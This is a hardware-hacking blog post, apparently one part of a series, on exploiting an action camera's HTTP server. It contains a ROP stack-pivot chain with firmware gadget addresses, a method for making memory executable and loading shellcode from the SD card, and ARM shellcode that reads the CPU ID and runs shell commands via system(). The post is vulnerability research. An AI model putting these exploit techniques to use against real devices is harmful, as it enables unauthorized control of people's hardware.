We've done the hard bit now - we've found a bug, and exploited it to get execution. Now we just need to burrow deeper for better access/control.

# Larger/Less Limited ROP-Chain

The most obvious target here (at least it was to me after staring at the **http_request_proc** for ages) is the 1024 byte buffer that is populated with the entire HTTP request - it has the following benefits:
- *Larger*: 1k bytes of space - remember that our 256 byte ROP-chain from the previous request will not be clobbered as only the HTTP method enters this buffer, so we'll only overwrite the first few bytes (which we did anyway when we triggered it for the pc control PoC)
- *No bad characters*: The **recv** will just keep receiving whatever is sent in, so there are no bad characters that will impact the contents of this buffer

## Writing the Stack Pivot Chain

Remember that this is still using the limited 256 byte chain. This chain does the following:
- Pop registers off of the stack
- Do the standard fixup we saw in the previous blog (client counts and **index.html** callback)
- Save the stack pointer to known global address (*0xc09ae8d4*)
- Load an amount to add to the saved stack pointer (*0xc8*)
- Add the saved stack pointer and loaded value to get the stack pivot address
- Use the same gadgets as the stack pointer fixup to get this new stack pointer into **r11**
- Run the first gadget of the larger chain which moves **r11 + 0x1c** into sp and pops off registers

```
-python
# Construct the raw HTTP GET request
request = method + b" /index.html HTTP/1.1\r\n"
request += b"Accept-Aa0Aa"
request += p32(0xc02b4edc) # pc

# 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control

request += p32(0xdeadbeef) # r11
request += p32(0xc01bbd80) # pc

# | 0xc01bbd80  | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
request += p32(0xc021ff38) # r4 <- we get this gadget to set the sp from our r11 and load registers from our new stack
request += p32(0xdeadbeef) # r5
request += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
request += p32(0xc09afec0) # r7 <- this MUSt be this address (it is the address of a mutex we unlock)

```

Cool, so now we have a much larger and less limited secondary ROP-chain to work with!

# Mapping Executable Memory

Now that we are less restrained on gadgets and values we can pop off of the stack (as we can now include null terminators), we should be able to figure out how memory is mapped, and reuse some of those functions to map some executable memory that we control.

## MPU or MMU?

At this point I still have no idea what the CPU in this MCU is, so I didn't know if it had an MPU or an MMU - I tried using the following function to turn the MPU off (which I reversed out of memory management functions) to disable all memory protections, letting me execute code:

![mem_read.png](/assets/images/analysing_an_action_camera_part_4/turn_off_mpu.png)

However this just kept resulting in weird crashes, even when I used gadgets to flush and invalidate the data/instruction caches - at this point I realised I would have to change strategy as this MCU probably doesn't have an MPU.

## Reversing Memory Mapping Code

As there aren't any nice commands for listing the memory map on this device, I had to manually search for where memory is being mapped. I ended up finding this function:

![setup_memory.png](/assets/images/analysing_an_action_camera_part_4/setup_memory.png)

We can see the **change_memory_attributes** function being called:

![change_memory_attributes.png](/assets/images/analysing_an_action_camera_part_4/change_memory_attributes.png)

So by the looks of it, the **rt_hw_mmu_change_attr** function is responsible for memory permissions (and it also looks like we do have an MMU!).

When looking at other places this function is used, I came across the **dlmodule_load_shared_object** function. Shared objects are executable code, so this will save us some reversing time if we steal the attributes value from this:

![attr_value.png](/assets/images/analysing_an_action_camera_part_4/attr_value.png)

The parameters are as follows:
- **va_start**: Virtual start address
- **pa_start**: Physical start address
- **size**: Size of memory to change attribute
- **attr**: New memory attribute

So all our ROP-chain needs to do is allocate some memory, get some code we control into it, and call **rt_hw_mmu_change_attr** on the memory to make it executable, then jump to it!

## Writing the Chain

When it comes to writing the chain, I still have to decide where the data is going to be loaded from:
- Maybe open a socket and send it in like I did with the camera?
- Somehow get a large chunk of data into global memory?
- Use the file write primitive we have and read the file into memory?

I ended up going with the last option, here is the secondary ROP-chain which does the following:
- Call **malloc_aligned** to get an aligned buffer (requirement of the memory attribute change)
- Use **rt_hw_mmu_change_attr** to make the allocated buffer executable
- Next call **fopen** to open the **/mnt/sdcard/test.aac** file (which we wrote earlier)
- With the file opened, we read it into the aligned buffer
- Finally, we branch to the buffer!

```

```

So now we can execute as much arbitrary shellcode as we want! Note that we will still need to do the expected fix up to continue execution.

# Testing Shellcodes

Now that we have got execution, lets see if we can use our new found access to answer earlier questions.

## What is the CPU?

ARM CPUs have a Main ID register (MIDR) which can be fetched with **mrc p15, #0, r1, c0, c0, #0**. The response can be broken down into the following:

![midr.png](/assets/images/analysing_an_action_camera_part_4/midr.png)

Here is a shellcode I put together to fetch this register and print the contents:

```
-python
    @ load chip ID register
    mrc p15, #0, r1, c0, c0, #0
    @ print chip ID
    adr r0, fmt_string
    ldr r3, =0xc01a79a0
    blx r3
    @ print fixing state string
    adr r0, fixing_state_string
    ldr r3, =0xc01a79a0
    blx r3
    @ fixup
    ldr r3, =#0xc09ae8d4
    ldr r2, [r3,#0x0]
    ldr r5, =#0x5d4
    ldr r6, =#0xc02202e4
    ldr r7, =#0xc09afec0
    add r11, r2, r5
    blx r6
fmt_string:
    .asciz "\033[35m[PWN]\033[0m CPU ID REGISTER CONTENTS: 0x%x\\n"
fixing_state_string:
    .asciz "\033[35m[PWN]\033[0m FIXING UP STATE\\n"
```

And lets take a look at the output on the debug shell:

![cpu_midr.png](/assets/images/analysing_an_action_camera_part_4/cpu_midr.png)

So the MIDR is 0x410fc075, putting together a quick python script to parse it yields the following output:

![midr_parse.png](/assets/images/analysing_an_action_camera_part_4/midr_parse.png)

And with that we have all the info we need! The CPU is ...

![drumroll.gif](/assets/images/analysing_an_action_camera_part_4/drumroll.gif)

An ARM Cortex-A7!

![cortex_a7_midr.png](/assets/images/analysing_an_action_camera_part_4/cortex_a7_midr.png)

## Executing Shell Commands Remotely

At this point there is no way to execute shell commands remotely, lets change that with a bit of shellcode! The standard call to **system()** works great.

```
-python
    adr r0, command_string
    ldr r3, =0xc01e4094
    blx r3
    @ fixup
    ldr r3, =#0xc09ae8d4
    ldr r2, [r3,#0x0]
    ldr r5, =#0x5d4
    ldr r6, =#0xc02202e4
    ldr r7, =#0xc09afec0
    add r11, r2, r5
    blx r6
command_string:
    .ascii "ls"
```

That was easy!

# Conclusion

We used our limited ROP-chain to make some more room for a larger, less limited ROP-chain. We then used this larger chain to load shellcode from a file into executable memory (by changing the permissions on it), and used this shellcode to identify the CPU, and run shell commands remotely!
